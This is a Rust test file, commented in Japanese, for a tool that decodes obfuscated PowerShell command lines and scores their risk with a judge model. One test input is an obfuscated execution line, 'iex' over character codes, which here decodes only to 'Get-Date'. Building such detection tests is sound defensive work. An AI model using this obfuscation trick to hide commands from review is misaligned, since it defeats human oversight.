    let model = FakeModel::quiet()
        .with_risk(WRAPPER, 1.6)
        .with_risk("Write-Host hello", 0.05);
    let out = run(
        &with_layers(
            WRAPPER,
            vec![text_layer(1, "Write-Host hello"), not_text_layer(1)],
        ),
        &[],
        Some(&model),
    );
    assert_eq!(out.severity(), Severity::High);
    assert!(
        has_model_reason(&out, &Origin::Command),
        "{:?}",
        out.reasons
    );
}

/// 包みの行では、流れと合わせた危険度も数えない。4問の呼び出しそのものは残す（解読要否・ファイル読みに使う）。
/// 対照（流れがあれば数える）は `the_sequence_counts_only_when_there_is_a_history`。
#[test]
fn the_sequence_does_not_count_for_a_wrapper_line() {
    let mut model = FakeModel::quiet().with_risk("Write-Host hello", 0.05);
    model.sequence = 1.8;
    let out = run(
        &with_layers(WRAPPER, vec![text_layer(1, "Write-Host hello")]),
        &["git status".into()],
        Some(&model),
    );
    assert!(
        !out.reasons
            .iter()
            .any(|r| matches!(r, RiskReason::Sequence(_))),
        "{:?}",
        out.reasons
    );
    assert_eq!(out.severity(), Severity::NeedsReview);
    assert!(
        model.calls().contains(&(
            json!({"command": WRAPPER, "history": ["git status"]}),
            vec!["risk", "needs_decoding", "reads_source", "sequence_risk"]
        )),
        "{:?}",
        model.calls()
    );
}

/// **途中の段（中にさらに解けた塊を持つ段）は判定モデルへ聞かない。** 一番内側の段で決める。
/// 対照: 内側が危険なら、その段（2段目）の点数で高。
#[test]
fn a_middle_layer_that_wraps_decoded_text_is_not_asked() {
    let middle = "pwsh --enc BBBB";
    let model = FakeModel::quiet()
        .with_risk(WRAPPER, 1.55)
        .with_risk(middle, 1.6)
        .with_risk("Write-Host hello", 0.05);
    let out = run(
        &with_layers(
            WRAPPER,
            vec![text_layer(1, middle), text_layer(2, "Write-Host hello")],
        ),
        &[],
        Some(&model),
    );
    assert!(!asked_risk_of(&model, middle), "途中の段を聞いた");
    assert!(asked_risk_of(&model, "Write-Host hello"));
    assert_eq!(out.severity(), Severity::NeedsReview, "{:?}", out.reasons);

    let model = FakeModel::quiet()
        .with_risk(middle, 1.6)
        .with_risk(DANGEROUS, 1.9);
    let out = run(
        &with_layers(
            WRAPPER,
            vec![text_layer(1, middle), text_layer(2, DANGEROUS)],
        ),
        &[],
        Some(&model),
    );
    assert_eq!(out.severity(), Severity::High);
    assert!(
        has_model_reason(&out, &Origin::Decoded { depth: 2 }),
        "{:?}",
        out.reasons
    );
    assert!(
        !has_model_reason(&out, &Origin::Decoded { depth: 1 }),
        "{:?}",
        out.reasons
    );
}

/// LLM が場所を示してハーネスが解いた段でも、行は解けた包みになる（無害な Get-Date の文字コード）。
#[test]
fn a_line_decoded_through_the_locator_is_a_wrapper_too() {
    let codes = "71,101,116,45,68,97,116,101";
    let line = format!("iex ([char[]]({codes}) -join '')");
    let mut model = FakeModel::quiet().with_risk(&line, 1.55);
    model.needs_decoding = 0.9;
    let locator = FakeLocator::answering(vec![LocatedSpan {
        text: codes.to_string(),
        encoding: PayloadEncoding::CharCodes,
    }]);
    let out = run_with(&shell(&line), &[], Some(&model), Some(&locator));
    assert!(
        matches!(&out.extra_decoded[..], [DecodedLayer { outcome: DecodeOutcome::Text { text, .. }, .. }] if text == "Get-Date"),
        "{:?}",
        out.extra_decoded
    );
    assert_eq!(out.severity(), Severity::NeedsReview, "{:?}", out.reasons);
    assert!(!has_model_reason(&out, &Origin::Command));
    assert!(asked_risk_of(&model, "Get-Date"));
}

/// 縛ったファイルの中で見つけた段は、行を解けた包みにしない（行の段の子ではない）。
#[test]
fn a_layer_found_in_a_file_does_not_make_the_line_a_wrapper() {
    let model = FakeModel::quiet().with_risk("python run.py", 1.7);
    let out = run(
        &with_layers(
            "python run.py",
            vec![in_file(text_layer(1, "Write-Host hello"), "run.py")],
        ),
        &[],
        Some(&model),
    );
    assert_eq!(out.severity(), Severity::High);
    assert!(
        has_model_reason(&out, &Origin::Command),
        "{:?}",
        out.reasons
    );
}

/// ファイルの中で見つけた塊への判定モデルの理由は、**そのファイルの名前で言う**（機械の理由と揃える。D-122）。
#[test]
fn a_model_reason_for_a_blob_in_a_file_names_the_file() {
    let model = FakeModel::quiet().with_risk(DANGEROUS, 1.9);
    let out = run(
        &with_layers(
            "uv run test.py",
            vec![in_file(text_layer(1, DANGEROUS), "test.py")],
        ),
        &[],
        Some(&model),
    );
    assert!(
        has_model_reason(
            &out,
            &Origin::File {
                path: "test.py".into()
            }
        ),
        "{:?}",
        out.reasons
    );
    assert!(
        !out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Model {
                origin: Origin::Decoded { .. },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
}

/// 直下の段の読み方: 前順で後ろに続き、深さがちょうど1つ深いもの。深さが戻るか、見つけたファイルが変わったら終わる。
#[test]
fn wrapping_is_read_from_the_direct_children_in_the_same_place() {
    let layers = vec![
        text_layer(1, "pwsh --enc BBBB"),  // 0 行: 子 1 が文字 → 包み
        text_layer(2, "Write-Host hello"), // 1 行: 子なし
        text_layer(1, "pwsh --enc CCCC"),  // 2 行: 子 3 が解けない → 包みでない
        not_text_layer(2),                 // 3 行
        in_file(text_layer(1, "pwsh --enc DDDD"), "a.py"), // 4 A: 子 5（孫 6 は数えない）
        in_file(text_layer(2, "pwsh --enc EEEE"), "a.py"), // 5 A: 子 6
        in_file(text_layer(3, "Write-Host hello"), "a.py"), // 6 A
        in_file(text_layer(1, "Get-Date"), "b.py"), // 7 B: 次は B の1段目なので子なし
        in_file(not_text_layer(1), "b.py"), // 8 B
    ];
    let wraps: Vec<bool> = (0..layers.len())
        .map(|i| wraps_decoded_text(&layers, i))
        .collect();
    assert_eq!(
        wraps,
        [true, false, false, false, true, true, false, false, false]
    );
    // 現実の並びでは起きないが、境目を深さだけに頼らないことを固定する。
    let crossing = vec![
        text_layer(1, "pwsh --enc BBBB"),
        in_file(text_layer(2, "Write-Host hello"), "a.py"),
    ];
    assert!(!wraps_decoded_text(&crossing, 0));

    // 行の直下は 0 と 2（どちらも文字）。ファイルの段（8 の解けない段を含む）は数えない。
    assert!(line_wraps_decoded_text(&layers, &[]));
    assert!(
        !line_wraps_decoded_text(&layers[4..], &[]),
        "ファイルの段だけ"
    );
    assert!(!line_wraps_decoded_text(&[], &[]), "塊が無い");
    assert!(!line_wraps_decoded_text(&layers, &[not_text_layer(1)]));
    assert!(line_wraps_decoded_text(
        &[],
        &[text_layer(1, "Get-Date"), not_text_layer(2)]
    ));
}
